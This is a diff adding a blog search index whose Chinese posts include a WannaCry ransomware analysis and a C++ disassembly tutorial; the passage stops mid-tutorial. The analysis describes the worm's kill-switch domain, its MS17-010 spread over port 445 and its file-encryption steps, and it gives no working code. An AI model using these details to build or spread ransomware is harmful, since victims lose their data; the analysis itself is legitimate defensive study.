@@ -1,0 +1,1576 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>恶意代码分析--永恒之蓝</title>
+    <url>/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D.html</url>
+    <content><![CDATA[<ul>
+<li>推荐书籍：&lt;恶意代码分析实战&gt;</li>
+</ul>
+<a id="more"></a>
+
+
+
+<h1 id="1-样本概述"><a href="#1-样本概述" class="headerlink" title="1. 样本概述"></a>1. 样本概述</h1><h2 id="1-1-样本信息"><a href="#1-1-样本信息" class="headerlink" title="1.1 样本信息"></a>1.1 样本信息</h2><ul>
+<li>病毒名称：wannacry.exe</li>
+<li>所属家族：Trojan.WanaCry.b</li>
+<li>大小: 3723264 bytes</li>
+<li>文件版本:6.1.7601.17514 (win7sp1_rtm.101119-1850)</li>
+<li>修改时间: 2017年5月13日, 13:55:05</li>
+<li>MD5: DB349B97C37D22F5EA1D1841E3C89EB4</li>
+<li>SHA1: E889544AFF85FFAF8B0D0DA705105DEE7C97FE26</li>
+<li>CRC32: 9FBB1227</li>
+<li>病毒行为：释放 tasksche.exe到系统目录，开启服务，利用漏洞进行局域网，广域网传播</li>
+</ul>
+<h2 id="1-2-测试环境及工具"><a href="#1-2-测试环境及工具" class="headerlink" title="1.2 测试环境及工具"></a>1.2 测试环境及工具</h2><ul>
+<li><p>测试环境：</p>
+<ul>
+<li>windows7-32位</li>
+</ul>
+</li>
+<li><p>分析工具：</p>
+<ul>
+<li>Hash</li>
+<li>IDA</li>
+<li>OD</li>
+<li>PCHunter</li>
+<li>火绒剑</li>
+<li>WSExplorer</li>
+<li>exeinfo</li>
+<li>PEID</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3 分析目标"></a>1.3 分析目标</h2><p>分析此病毒的恶意行为</p>
+<h2 id="1-4-恶意程序对用户造成的危害"><a href="#1-4-恶意程序对用户造成的危害" class="headerlink" title="1.4 恶意程序对用户造成的危害"></a>1.4 恶意程序对用户造成的危害</h2><p><img data-src="/images/wannacry/1.png"></p>
+<h1 id="2-收集信息"><a href="#2-收集信息" class="headerlink" title="2. 收集信息"></a>2. 收集信息</h1><h2 id="2-1-使用PEID进行分析"><a href="#2-1-使用PEID进行分析" class="headerlink" title="2.1 使用PEID进行分析"></a>2.1 使用PEID进行分析</h2><ul>
+<li><p>版本信息：Microsoft Visual C++ 6.0</p>
+<p><img data-src="/images/wannacry/2.png"></p>
+</li>
+<li><p>查看导出导入表；资源操作，服务操作，网络和网卡相关操作</p>
+<p><img data-src="/images/wannacry/3.png"></p>
+</li>
+<li><p>查看算法：ZLIB,AES……</p>
+<p><img data-src="/images/wannacry/4.png"></p>
+</li>
+</ul>
+<h2 id="2-2-使用ResourceHacker查看资源"><a href="#2-2-使用ResourceHacker查看资源" class="headerlink" title="2.2 使用ResourceHacker查看资源"></a>2.2 使用ResourceHacker查看资源</h2><ul>
+<li><p>发现包含了一个PE文件，将这个文件导出</p>
+<p><img data-src="/images/wannacry/5.png"></p>
+</li>
+</ul>
+<h2 id="2-3-查看导出资源信息"><a href="#2-3-查看导出资源信息" class="headerlink" title="2.3 查看导出资源信息"></a>2.3 查看导出资源信息</h2><h3 id="2-3-1-使用PEID查看信息"><a href="#2-3-1-使用PEID查看信息" class="headerlink" title="2.3.1 使用PEID查看信息"></a>2.3.1 使用PEID查看信息</h3><ul>
+<li><p>版本信息：Microsoft Visual C++ 6.0</p>
+<p><img data-src="/images/wannacry/6.png"> </p>
+</li>
+<li><p>导入导出表：再次使用到了资源</p>
+<p><img data-src="/images/wannacry/7.png"> </p>
+</li>
+</ul>
+<h2 id="2-4-查看被导出资源的资源信息"><a href="#2-4-查看被导出资源的资源信息" class="headerlink" title="2.4 查看被导出资源的资源信息"></a>2.4 查看被导出资源的资源信息</h2><ul>
+<li><p>发现它是一个压缩包</p>
+<p><img data-src="/images/wannacry/8.png"> </p>
+</li>
+<li><p>查看这个压缩包里的内容，都是已加密文件，解压密码在病毒程序里</p>
+<p> <img data-src="/images/wannacry/9.png"></p>
+</li>
+</ul>
+<h1 id="3．详细分析"><a href="#3．详细分析" class="headerlink" title="3．详细分析"></a>3．详细分析</h1><h2 id="3-1-wannacry-exe部分详细分析"><a href="#3-1-wannacry-exe部分详细分析" class="headerlink" title="3.1 wannacry.exe部分详细分析"></a>3.1 wannacry.exe部分详细分析</h2><p><strong>3.1.1 蠕虫代码运行后先</strong></p>
+<ul>
+<li><p>会连接域名 <a href="http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com,/">http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com</a></p>
+</li>
+<li><p>如果域名可以成功连接，就会直接退出</p>
+<p><img data-src="/images/wannacry/10.png"> </p>
+</li>
+</ul>
+<p><strong>3.1.2 如果域名无法访问，则会执行病毒代码</strong></p>
+<p>​    <img data-src="/images/wannacry/11.png"> </p>
+<p><strong>3.1.3 如果是双击运行</strong></p>
+<p>​    <img data-src="/images/wannacry/12.png"> </p>
+<p><strong>3.1.4 以服务方式启动自身并且在系统目录下创建c:\windows\Tasksche.exe并启动</strong></p>
+<p>​    <img data-src="/images/wannacry/13.png"> </p>
+<p><strong>3.1.5 以服务方式启动，参数为 -m security</strong></p>
+<p>​    <img data-src="/images/wannacry/14.png"> </p>
+<p><strong>3.1.6 如果参数大于1，会利用MS17-010漏洞传播，传播分为局域网传播和公网传播</strong></p>
+<p>​    <img data-src="/images/wannacry/15.png"> </p>
+<p><strong>3.1.7 局域网传播代码如下，循环尝试攻击</strong></p>
+<p>​    <img data-src="/images/wannacry/16.png"> </p>
+<p><strong>3.1.8 利用445端口进行攻击</strong></p>
+<p>​    <img data-src="/images/wannacry/17.png"> </p>
+<p><strong>3.1.9 公网传播代码如下，病毒随机生成IP地址，发送攻击代码</strong></p>
+<p>​    <img data-src="/images/wannacry/18.png"> </p>
+<h2 id="3-2-tasksche-exe部分详细分析"><a href="#3-2-tasksche-exe部分详细分析" class="headerlink" title="3.2 tasksche.exe部分详细分析"></a>3.2 tasksche.exe部分详细分析</h2><p>​    <img data-src="/images/wannacry/19.png"> </p>
+<p>​    <img data-src="/images/wannacry/20.png"> </p>
+<p><strong>3.2.1 创建服务目录</strong></p>
+<p>​    <img data-src="/images/wannacry/21.png">  </p>
+<p><strong>3.2.2 创建服务并启动程序</strong></p>
+<p>​    <img data-src="/images/wannacry/22.png">  </p>
+<p><strong>3.2.3 设置注册表或获取注册表</strong></p>
+<p>​    <img data-src="/images/wannacry/23.png">  </p>
+<p><strong>3.2.4 解压密码</strong></p>
+<p>​    <img data-src="/images/wannacry/24.png">  </p>
+<p><strong>3.2.5 在c.wnry文件中写入钱包地址</strong></p>
+<p>​    <img data-src="/images/wannacry/25.png">  </p>
+<p>​    <img data-src="/images/wannacry/26.png">  </p>
+<p><strong>3.2.6 解密t.wnry文件内容，返回PE文件</strong></p>
+<p>​    <img data-src="/images/wannacry/27.png">  </p>
+<p>​    <img data-src="/images/wannacry/28.png">  </p>
+<ul>
+<li><p>Decode第一个参数：</p>
+<p><img data-src="/images/wannacry/29.png">  </p>
+</li>
+<li><p>从这里开始往后读，将所有内容都读取进来</p>
+<p><img data-src="/images/wannacry/30.png">  </p>
+</li>
+<li><p>一直读到结束，是0x10000个字节</p>
+<p><img data-src="/images/wannacry/31.png">   </p>
+</li>
+<li><p>复制所有数据，新建dll文件，使用010打开，粘贴</p>
+<p><img data-src="/images/wannacry/32.png">   </p>
+<p><img data-src="/images/wannacry/33.png">   </p>
+<p><img data-src="/images/wannacry/34.png">   </p>
+</li>
+</ul>
+<p><strong>3.2.7 加载dll文件到虚拟空间中</strong></p>
+<p>​    <img data-src="/images/wannacry/35.png">   </p>
+<p>​    <img data-src="/images/wannacry/36.png">   </p>
+<p>​    <img data-src="/images/wannacry/37.png">   </p>
+<h2 id="3-3-3-dll部分详细分析"><a href="#3-3-3-dll部分详细分析" class="headerlink" title="3.3 3.dll部分详细分析"></a>3.3 3.dll部分详细分析</h2><p>​    <img data-src="/images/wannacry/38.png">   </p>
+<p>​    <img data-src="/images/wannacry/39.png">   </p>
+<p>​    <img data-src="/images/wannacry/40.png">   </p>
+<p><strong>3.3.1 检测是否是系统用户，,程序内置一个 SID 号,用于和获取到的当前用户 SID 进行对比</strong></p>
+<p>​    <img data-src="/images/wannacry/41.png"> </p>
+<p><strong>3.3.2 启动解密程序 @WanaDecryptor@.exe 程序，将病毒目录写入到开机启动中</strong></p>
+<p>​    <img data-src="/images/wannacry/42.png"> </p>
+<p><strong>3.3.3 创建 0000000.pky 和 00000000.eky 文件</strong></p>
+<p>​    <img data-src="/images/wannacry/43.png"> </p>
+<ul>
+<li><p>创建私钥00000000.eky文件，被加密</p>
+<p><img data-src="/images/wannacry/44.png"> </p>
+</li>
+</ul>
+<p><strong>3.3.4 创建000000000.res写入数据，全局变量pbBuffer</strong></p>
+<p>​    <img data-src="/images/wannacry/45.png"> </p>
+<p><strong>3.3.5 如果有磁盘设备加入，就遍历目录，加密文件</strong></p>
+<p>​    <img data-src="/images/wannacry/46.png"> </p>
+<ul>
+<li><p>传入磁盘的下标</p>
+<p><img data-src="/images/wannacry/47.png"> </p>
+</li>
+<li><p>移动部分文件到临时目录中，由f.wnry文件保存这些文件名</p>
+<p><img data-src="/images/wannacry/48.png"> </p>
+</li>
+<li><p>加密文件</p>
+<p><img data-src="/images/wannacry/49.png"> </p>
+<p><img data-src="/images/wannacry/50.png"> </p>
+</li>
+</ul>
+<p><strong>3.3.6 启动资源中的tastdl.exe</strong></p>
+<p>​    <img data-src="/images/wannacry/51.png"> </p>
+<p><strong>3.3.7 创建bat脚本，执行代码</strong></p>
+<p>​    <img data-src="/images/wannacry/52.png"> </p>
+<p>​    <img data-src="/images/wannacry/53.png"> </p>
+<p>​    <img data-src="/images/wannacry/54.png"> </p>
+<ul>
+<li><p>运行批处理文件，u.wnry变为解密文件@WanaDecryptor@.exe</p>
+<p><img data-src="/images/wannacry/55.png"> </p>
+</li>
+<li><p>加密文件</p>
+<p><img data-src="/images/wannacry/56.png"> </p>
+</li>
+</ul>
+<h1 id="4．解决方案"><a href="#4．解决方案" class="headerlink" title="4．解决方案"></a>4．解决方案</h1><ol>
+<li><p>做好文件备份，给系统打补丁</p>
+</li>
+<li><p>关闭445端口</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>恶意代码分析</category>
+      </categories>
+      <tags>
+        <tag>恶意代码分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>脱壳入门-寻找OEP</title>
+    <url>/%E8%84%B1%E5%A3%B3%E5%85%A5%E9%97%A8-%E5%AF%BB%E6%89%BEOEP.html</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>脱壳</category>
+      </categories>
+      <tags>
+        <tag>脱壳</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C++反汇编分析</title>
+    <url>/C++%E5%8F%8D%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90.html</url>
+    <content><![CDATA[<ul>
+<li>本节讲解了逆向分析中，C++在反汇编中的特征以及 <code>mfc</code> 程序逆向的方式</li>
+<li>推荐书籍：《C++反汇编与逆向分析技术揭秘》</li>
+</ul>
+<a id="more"></a>
+
+
+
+<h1 id="使用IDA分析程序"><a href="#使用IDA分析程序" class="headerlink" title="使用IDA分析程序"></a>使用IDA分析程序</h1><h2 id="开辟函数栈帧"><a href="#开辟函数栈帧" class="headerlink" title="开辟函数栈帧"></a>开辟函数栈帧</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; push    ebp</span><br><span class="line">; mov     ebp, esp</span><br><span class="line">; sub     esp, 0E4h       ; 开辟函数的栈帧，栈帧大小为 0xe4</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="保存寄存器环境"><a href="#保存寄存器环境" class="headerlink" title="保存寄存器环境"></a>保存寄存器环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; push    ebx</span><br><span class="line">; push    esi</span><br><span class="line">; push    edi             ; 保存寄存器环境，因为当前函数使用了这些寄存器，如果不保存函数内部对寄存器的修改会直接影响到外部函数，可能会导致程序出现问题</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="初始化局部变量"><a href="#初始化局部变量" class="headerlink" title="初始化局部变量"></a>初始化局部变量</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; lea     edi, [ebp+var_E4]</span><br><span class="line">; mov     ecx, 39h</span><br><span class="line">; mov     eax, 0CCCCCCCCh</span><br><span class="line">; rep stosd               ; 初始化函数的栈帧保存的是 0xCCCCCCCC，因为有这个设置，所以未初始化的局部变量保存的就是 &quot;烫烫烫&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="初始化安全cookie"><a href="#初始化安全cookie" class="headerlink" title="初始化安全cookie"></a>初始化安全cookie</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; mov     eax, ___security_cookie</span><br><span class="line">; xor     eax, ebp</span><br><span class="line">; mov     [ebp+var_4], eax ; 编译器提供一个随机的安全cookie，以当前的ebp为key对安全cookie进行加密操作并保存到ebp+var_4的位置</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检测是否是库函数"><a href="#检测是否是库函数" class="headerlink" title="检测是否是库函数"></a>检测是否是库函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; mov     ecx, offset unk_41D007</span><br><span class="line">; call    j_@__CheckForDebuggerJustMyCode@4 ; __CheckForDebuggerJustMyCode(x)   </span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检测堆栈平衡"><a href="#检测堆栈平衡" class="headerlink" title="检测堆栈平衡"></a>检测堆栈平衡</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;; cmp     esi, esp</span><br><span class="line">&#x2F;&#x2F; call    j___RTC_CheckEsp ; 检查堆栈是否平衡，通常出现在需要平衡堆栈的函数调用之后，会在函数调用之前先保存 esp 的值，函数调用之后进行比对，如果不同就会引发程序的崩溃</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="恢复寄存器环境"><a href="#恢复寄存器环境" class="headerlink" title="恢复寄存器环境"></a>恢复寄存器环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; xor     eax, eax</span><br><span class="line">; pop     edi</span><br><span class="line">; pop     esi</span><br><span class="line">; pop     ebx             ; 恢复之前保存的寄存器环境</span><br><span class="line">; add     esp, 0E4h</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检测数组是否越界"><a href="#检测数组是否越界" class="headerlink" title="检测数组是否越界"></a>检测数组是否越界</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; xor     eax, eax</span><br><span class="line">; push    edx</span><br><span class="line">; mov     ecx, ebp</span><br><span class="line">; push    eax</span><br><span class="line">; lea     edx, dword_411420</span><br><span class="line">; call    j_@_RTC_CheckStackVars@8 ;检测数组是否越界的函数，通常会在数组的赋值操作之后，原理就是在初始化堆栈的时候，编译器将栈帧的所有内容写作了0xcc，所以数组的结尾应该就是0xcc，假设越界赋值，后面的0xcc就被覆盖，这个函数的作用就是检查有没有被覆盖是为了防止缓冲区溢出攻击而产生的机制，应该叫做 GS</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="关闭栈帧"><a href="#关闭栈帧" class="headerlink" title="关闭栈帧"></a>关闭栈帧</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; cmp     ebp, esp</span><br><span class="line">; call    j___RTC_CheckEsp</span><br><span class="line">; mov     esp, ebp</span><br><span class="line">; pop     ebp</span><br><span class="line">; retn                    ; 函数要保证执行前后的堆栈是平衡的，所以这里需要关闭栈帧</span><br><span class="line">; endp</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="C-反汇编"><a href="#C-反汇编" class="headerlink" title="C++反汇编"></a>C++反汇编</h1><h2 id="基本常量类型"><a href="#基本常量类型" class="headerlink" title="基本常量类型"></a>基本常量类型</h2><ul>
+<li><p><strong><em>浮点常量</em></strong></p>
+<ul>
+<li>被保存在常量区，初始化时需要通过 <code>xmm</code> 寄存器</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">float</span>  fNum = <span class="number">1.5</span>;        <span class="comment">// 浮点常量</span></span><br><span class="line"><span class="comment">// movss       xmm0, dword ptr ds : [00217BD8h]</span></span><br><span class="line"><span class="comment">// movss       dword ptr[ebp - 38h], xmm0</span></span><br><span class="line"><span class="comment">// mov         dword ptr[ebp - 4Ch], 1</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>字符串常量</em></strong></p>
+<ul>
+<li>常量字符串保存在常量区，赋值使用的实际是所在的地址</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* szHello = <span class="string">&quot;Hello world&quot;</span>;            <span class="comment">// 字符串常量</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_2C], offset aHelloWorld(字符串地址)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>字符</em></strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>  ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="comment">// mov     [ebp+var_1D], 41h ;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>整型</em></strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nNum = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// mov     [ebp+var_8], 1</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>布尔常量</em></strong></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">bool</span> bRet = <span class="literal">true</span>;         <span class="comment">// 布尔常量</span></span><br><span class="line"><span class="comment">// mov         byte ptr[ebp - 5], 1</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>字符串的初始化</em></strong></p>
+<ul>
+<li>字符串数组</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> szStr[<span class="number">100</span>] = &#123; <span class="string">&quot;szStr[100] Hello world&quot;</span> &#125;;</span><br><span class="line"><span class="comment">// mov     esi, offset aSzstr100HelloW ; &quot;szStr[100] Hello world&quot;</span></span><br><span class="line"><span class="comment">// lea     edi, [ebp+var_6C]</span></span><br><span class="line"><span class="comment">// rep movsd</span></span><br><span class="line"><span class="comment">// movsw</span></span><br><span class="line"><span class="comment">// movsb</span></span><br><span class="line"><span class="comment">// push    4Dh ; &#x27;M&#x27;       ; Size</span></span><br><span class="line"><span class="comment">// push    0               ; Val</span></span><br><span class="line"><span class="comment">// lea     eax, [ebp+Dst]</span></span><br><span class="line"><span class="comment">// push    eax             ; Dst</span></span><br><span class="line"><span class="comment">// call    j_memset         ; 将数组没有给定值的其他部分初始化为0    </span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>指针和引用</em></strong></p>
+</li>
+<li><p>引用类型的参数也占内存空间，其中保存的数据是一个地址值</p>
+</li>
+<li><p>指针和引用难以区分，在反汇编下，没有引用这种数据类型</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">// mov     [ebp+var_C], 0Ah</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>* pnumber = &amp;number;</span><br><span class="line">    <span class="comment">// lea     eax, [ebp+var_C]</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_18], eax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>&amp; rnumber = number;</span><br><span class="line">    <span class="comment">// lea     eax, [ebp+var_C]</span></span><br><span class="line">    <span class="comment">// mov     [ebp+var_24], eax</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>常量</em></strong></p>
+</li>
+<li><p>#define 是一个真常量，而 <code>const</code> 却是由编译器判断实现的常量，是一个假常量</p>
+</li>
+<li><p>使用 <code>const</code> 定义的变量，最终还是一个变量，只是在编译器内进行了检查，发现有修改则报错 </p>
+</li>
+<li><p>由于编译器在编译期间对 <code>const</code> 变量进行检查，因此被 <code>const</code> 修饰过的变量是可以修改的，利用指针获取到 <code>const</code> 修饰过的变量地址，强制将指针的 <code>const</code> 修饰去掉，就可以修改对应的数据内容</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE  100   </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> nCount = SIZE;    <span class="comment">// const常量</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_8], 64h ;</span></span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line">    </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> nConst = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// mov     [ebp+var_C], 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *pConst = (<span class="keyword">int</span>*)&amp;nConst;</span><br><span class="line"><span class="comment">// lea     eax, [ebp+var_C]     ; 获取 ebp+var_C 地址并存入 eax 中</span></span><br><span class="line"><span class="comment">// mov     [ebp+var_18], eax    ; 将 eax 中的数据赋值到地址 ebp+var_18 处</span></span><br><span class="line"></span><br><span class="line">*pConst = <span class="number">6</span>;</span><br><span class="line"><span class="comment">// mov     eax, [ebp+var_18]    ; 获取 ebp+var_18 中的数据并存入 eax</span></span><br><span class="line"><span class="comment">// mov     dword ptr [eax], 6   ; 将地址 ebp+var_18 中保存的数据修改为 6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nVar = nConst;</span><br><span class="line"><span class="comment">// mov     [ebp+var_24], 5      ; 将 5 赋值到地址 ebp+var_24 处</span></span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="全局变量和局部变量的区别"><a href="#全局变量和局部变量的区别" class="headerlink" title="全局变量和局部变量的区别"></a>全局变量和局部变量的区别</h2><ul>
+<li><p><strong><em>全局变量</em></strong></p>
+<ul>
+<li>全局变量是通过立即数来访问</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> g_nNum1 = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// mov     ecx, dword_41A000</span></span><br><span class="line"><span class="comment">// push    ecx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_nNum2 = <span class="number">2</span>;</span><br><span class="line"><span class="comment">// mov     eax, dword_41A004</span></span><br><span class="line"><span class="comment">// push    eax</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, g_nNum1, g_nNum2);</span><br><span class="line">    <span class="comment">// push    offset aDD       ; &quot;%d %d&quot;</span></span><br><span class="line">    <span class="comment">// call    sub_41104B       ; 调用 printf 函数</span></span><br><span class="line">    <span class="comment">// add     esp, 0Ch         ; 平衡 printf 函数的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>局部变量</em></strong></p>
+<ul>
+<li>局部变量的访问是通过栈指针相对间接访问</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> nOne = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// mov     [ebp+var_C], 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> nTwo = <span class="number">2</span>;</span><br><span class="line"><span class="comment">// mov     [ebp+var_18], 2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;nOne, &amp;nTwo);</span><br><span class="line"><span class="comment">// push    offset aDD      ; &quot;%d %d&quot;</span></span><br><span class="line"><span class="comment">// call    sub_41104B</span></span><br><span class="line"><span class="comment">// add     esp, 0Ch</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>局部静态变量</em></strong></p>
+<ul>
+<li>局部静态变量不会随作用域的结束而消失，并且在未进入作用域之前就已经存在，其生命周期和全局变量相同</li>
+<li>局部静态变量和全局变量都保存在执行文件中的数据区中，局部静态变量会预先被作为全局变量处理，而它的初始化部分只是在做赋值操作</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowStatic</span><span class="params">(<span class="keyword">int</span> nNumber)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> snNumber = nNumber;</span><br><span class="line">    <span class="comment">// mov     eax, TlsIndex</span></span><br><span class="line">    <span class="comment">// mov     ecx, large fs:2Ch</span></span><br><span class="line">    <span class="comment">// mov     edx, [ecx+eax*4]</span></span><br><span class="line">    <span class="comment">// mov     eax, dword_41B150            ; 此线程是局部静态变量的初始化标志，初始为0</span></span><br><span class="line">    <span class="comment">// cmp     eax, [edx+104h]              ; [edx+104h]--&gt;[[ecx+eax*4]+104h]--&gt;[[fs:wch]+TlsIndex+104h]</span></span><br><span class="line">    <span class="comment">// jle     short loc_41185F             ; 判断是否已经初始化</span></span><br><span class="line">    <span class="comment">// push    offset dword_41B150</span></span><br><span class="line">    <span class="comment">// call    j___Init_thread_header       ; 保证局部的静态对象的初始化</span></span><br><span class="line">    <span class="comment">// add     esp, 4</span></span><br><span class="line">    <span class="comment">// cmp     dword_41B150, 0FFFFFFFFh     ; 判断是否属于初始化状态</span></span><br><span class="line">    <span class="comment">// jnz     short loc_41185F</span></span><br><span class="line">    <span class="comment">// mov     eax, [ebp+arg_0]</span></span><br><span class="line">    <span class="comment">// mov     dword_41B14C, eax            ; 初始化</span></span><br><span class="line">    <span class="comment">// push    offset dword_41B150</span></span><br><span class="line">    <span class="comment">// call    j___Init_thread_footer       ; 保证局部的静态对象的初始化</span></span><br><span class="line">    <span class="comment">// add     esp, 4</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, snNumber);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ShowStatic(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><em>堆变量</em></strong></p>
+</li>
+<li><p>确定变量空间属于堆空间只要找到两个关键点</p>
+<ul>
+<li>空间申请：malloc 与 new</li>
+<li>空间释放：free 与 delete</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *pCharMalloc = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"><span class="comment">// push    0Ah                  ; Size</span></span><br><span class="line"><span class="comment">// call    ds:__imp_malloc</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">char</span> *pCharNew = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">10</span>];</span><br><span class="line"><span class="comment">// push    0Ah                  ; Size</span></span><br><span class="line"><span class="comment">// call    j_unknown_libname_5  ; 跟进去可以发现，最后还是调用了 __imp_malloc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pCharMalloc != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(pCharMalloc);</span><br><span class="line">    <span class="comment">// mov     eax, [ebp+Memory]</span></span><br><span class="line">    <span class="comment">// push    eax             ; Memory</span></span><br><span class="line">    <span class="comment">// call    ds:free</span></span><br><span class="line">    </span><br><span class="line">    pCharMalloc = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pCharNew != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span>[]pCharNew;</span><br><span class="line">    <span class="comment">// mov     ecx, [ebp+var_EC]</span></span><br><span class="line">    <span class="comment">// push    ecx             ; void *</span></span><br><span class="line">    <span class="comment">// call    sub_411258       ; __imp__free_dbg</span></span><br><span class="line">    </span><br><span class="line">    pCharNew = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="数组和指针"><a href="#数组和指针" class="headerlink" title="数组和指针"></a>数组和指针</h2><ul>
+<li><p><strong><em>数组在函数内</em></strong></p>
+<ul>
